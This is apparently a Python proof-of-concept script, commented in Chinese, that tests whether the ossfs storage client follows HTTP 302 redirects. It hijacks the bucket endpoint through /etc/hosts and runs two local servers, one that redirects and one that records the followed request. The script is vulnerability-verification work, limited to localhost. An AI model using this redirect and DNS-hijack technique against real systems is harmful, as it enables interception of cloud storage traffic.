#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
工作原理 (双端口方案):
  端口 80   — 拦截代理: 接收 ossfs 请求, 返回 302 到 127.0.0.1:9999
  端口 9999 — 捕获服务: 如果收到请求 → 证明 ossfs 跟随了重定向

使用方法:
  # 1. 劫持 DNS
  echo "127.0.0.1 <bucket>.oss-cn-shanghai-internal.aliyuncs.com" >> /etc/hosts

  # 2. 启动本脚本
  python3 poc_302_redirect.py

  # 3. 挂载 ossfs

  # 4. 触发请求
  ls /mnt/test/
"""

import argparse
import sys
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler


# ============================================================================
# 端口 80 — 拦截代理 (返回 302)
# ============================================================================

class RedirectHandler(BaseHTTPRequestHandler):
    """端口 80: 拦截 ossfs 请求, 对所有请求返回 302 重定向到端口 9999"""

    capture_port = 9999

    def do_GET(self):
        self._redirect()

    def do_HEAD(self):
        self._redirect()

    def do_PUT(self):
        self._redirect()

    def _redirect(self):
        host = self.headers.get('Host', 'unknown')
        redirect_url = f"http://127.0.0.1:{self.capture_port}{self.path}"

        print(f"\n[PORT 80] {self.command} {self.path}")
        print(f"  Host: {host}")
        print(f"  → 302 Location: {redirect_url}")

        self.send_response(302)
        self.send_header('Location', redirect_url)
        self.send_header('Content-Length', '0')
        self.end_headers()

    def log_message(self, format, *args):
        pass


# ============================================================================
# 端口 9999 — 捕获服务 (验证 ossfs 是否跟随了重定向)
# ============================================================================

class CaptureHandler(BaseHTTPRequestHandler):
    """端口 9999: 如果收到请求, 说明 ossfs 跟随了 302 重定向"""

    request_count = 0

    def do_GET(self):
        self._capture()

    def do_HEAD(self):
        self._capture()

    def do_PUT(self):
        self._capture()

    def _capture(self):
        CaptureHandler.request_count += 1
        host = self.headers.get('Host', 'unknown')

        print(f"\n{'='*60}")
        print(f"[PORT 9999] *** 收到重定向后的请求! (第 {CaptureHandler.request_count} 次) ***")
        print(f"  Method: {self.command}")
        print(f"  Path:   {self.path}")
        print(f"  Host:   {host}")
        print(f"")
        print(f"  [!!!] 漏洞确认: ossfs 跟随了 302 重定向!")
        print(f"  [!!!] CURLOPT_FOLLOWLOCATION=true 使 ossfs 可被重定向到任意目标")
        print(f"{'='*60}")

        # 返回一个简单响应
        body = b'<html><body>MITM: redirect followed</body></html>'
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):
        pass


# ============================================================================
# 主入口
# ============================================================================

def run_servers(listen_port, capture_port):
    """启动双端口服务"""
    RedirectHandler.capture_port = capture_port

    # 启动捕获服务
    capture_server = HTTPServer(('0.0.0.0', capture_port), CaptureHandler)
    capture_thread = threading.Thread(target=capture_server.serve_forever, daemon=True)
    capture_thread.start()

    # 启动拦截代理
    redirect_server = HTTPServer(('0.0.0.0', listen_port), RedirectHandler)

    print("=" * 70)
    print(" ossfs 302 重定向跟随验证 PoC")
    print("=" * 70)
    print(f"\n[*] 端口 {listen_port}: 拦截代理 (对所有请求返回 302)")
    print(f"[*] 端口 {capture_port}: 捕获服务 (检测 ossfs 是否跟随重定向)")
    print()
    print("[*] 判定标准:")
    print(f"    端口 {capture_port} 收到请求 → ossfs 跟随了 302 (存在漏洞)")
    print(f"    端口 {capture_port} 无请求   → ossfs 未跟随 302 (修复有效)")
    print()
    print("[*] 按 Ctrl+C 停止")
    print("-" * 70)

    try:
        redirect_server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n\n[*] 总计: 端口 {capture_port} 收到 {CaptureHandler.request_count} 次重定向请求")
        if CaptureHandler.request_count > 0:
            print("[!] 结论: ossfs 跟随了 302 重定向")
        else:
            print("[OK] 结论: ossfs 未跟随 302 重定向")
        redirect_server.server_close()
        capture_server.server_close()


def main():
    parser = argparse.ArgumentParser(
        description="ossfs 302 重定向跟随验证",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  sudo python3 %(prog)s
  sudo python3 %(prog)s --listen 80 --capture 9999
        """
    )

    parser.add_argument('--listen', type=int, default=80,
                        help='拦截代理监听端口 (默认: 80)')
    parser.add_argument('--capture', type=int, default=9999,
                        help='捕获服务监听端口 (默认: 9999)')

    args = parser.parse_args()
    run_servers(args.listen, args.capture)


if __name__ == '__main__':
    main()
